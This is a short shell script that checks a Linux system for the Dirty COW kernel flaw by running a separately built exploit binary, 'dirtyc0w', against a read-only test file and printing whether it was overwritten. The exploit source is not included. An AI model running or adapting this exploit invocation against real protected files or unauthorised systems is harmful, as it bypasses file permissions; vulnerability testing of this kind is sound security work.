#!/bin/sh
set -e

# print the test script
echo
echo "Test for Dirty Cow:"
echo "  $ echo \"You are SAFE!          \" > foo"
echo "  $ chmod 404 foo"
echo "  $ ./dirtyc0w foo \"You are VULNERABLE!!!\" &"
echo "  $ sleep 2"
echo "  $ cat foo"

# run the test script
echo "You are SAFE!          " > foo
chmod 404 foo
./dirtyc0w foo "You are VULNERABLE!!!" &
sleep 2
cat foo
